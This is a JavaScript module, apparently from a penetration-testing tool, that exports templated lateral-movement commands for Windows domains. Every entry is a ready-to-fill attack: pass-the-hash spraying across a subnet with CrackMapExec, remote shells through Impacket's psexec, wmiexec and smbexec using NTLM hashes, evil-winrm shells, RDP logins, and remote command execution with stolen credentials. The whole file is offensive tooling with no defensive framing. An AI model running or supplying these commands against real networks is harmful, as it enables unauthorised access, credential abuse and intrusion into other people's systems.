export const lateralMovementCommands = {
    techniques: [
        {
            name: "Pass-the-Hash (CrackMapExec)",
            description: "Spray NTLM hash across the subnet or specific targets.",
            commands: [
                "crackmapexec smb {{DC_IP}}/24 -u {{USERNAME}} -H {{NTLM_HASH}} --continue-on-success",
                "crackmapexec smb {{TARGET_IP}} -u {{USERNAME}} -H {{NTLM_HASH}} --shares"
            ]
        },
        {
            name: "Pass-the-Hash (Impacket)",
            description: "Spawn interactive shell on a target using NTLM hash.",
            commands: [
                "psexec.py {{DOMAIN}}/{{USERNAME}}@{{TARGET_IP}} -hashes :{{NTLM_HASH}}",
                "wmiexec.py {{DOMAIN}}/{{USERNAME}}@{{TARGET_IP}} -hashes :{{NTLM_HASH}}",
                "smbexec.py {{DOMAIN}}/{{USERNAME}}@{{TARGET_IP}} -hashes :{{NTLM_HASH}}"
            ]
        },
        {
            name: "Evil-WinRM",
            description: "WinRM shell using credentials or hash (port 5985).",
            commands: [
                "evil-winrm -i {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}'",
                "evil-winrm -i {{TARGET_IP}} -u {{USERNAME}} -H {{NTLM_HASH}}"
            ]
        },
        {
            name: "Remote Desktop Protocol (RDP)",
            description: "RDP access using credentials.",
            commands: [
                "xfreerdp /v:{{TARGET_IP}} /u:{{USERNAME}} /p:'{{PASSWORD}}' /d:{{DOMAIN}} /dynamic-resolution",
                "mstsc /v:{{TARGET_IP}}"
            ]
        },
        {
            name: "PsExec (credentials)",
            description: "Execute processes on a remote system with plaintext credentials.",
            commands: [
                "psexec.py {{DOMAIN}}/{{USERNAME}}:'{{PASSWORD}}'@{{TARGET_IP}}",
                "crackmapexec smb {{TARGET_IP}} -u {{USERNAME}} -p '{{PASSWORD}}' -x 'whoami'"
            ]
        }
    ]
};